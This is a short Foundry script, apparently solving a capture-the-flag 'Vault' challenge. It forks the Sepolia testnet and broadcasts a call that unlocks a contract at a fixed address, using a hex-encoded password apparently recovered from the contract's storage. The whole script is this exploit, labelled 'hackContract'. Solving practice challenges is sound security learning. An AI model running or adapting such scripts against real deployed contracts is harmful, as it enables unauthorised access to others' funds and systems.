// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Vault} from "../src/Vault.sol";

contract VaultScript is Script {
    function setUp() public {}

    function run() public {
        hackContract();
    }

    function hackContract() internal {
        uint256 sepolia = vm.createFork(vm.rpcUrl("sepolia"));

        address VaultAddress = 0x1bE7733750a0f30a7315C234a3033EEa29d5b9D4;
        vm.selectFork(sepolia);

        vm.startBroadcast();

        console.log("Starting Hacking");

        assert(Vault(VaultAddress).locked() == true);

        Vault(VaultAddress).unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);

        assert(Vault(VaultAddress).locked() == false);

        vm.stopBroadcast();
    }
}
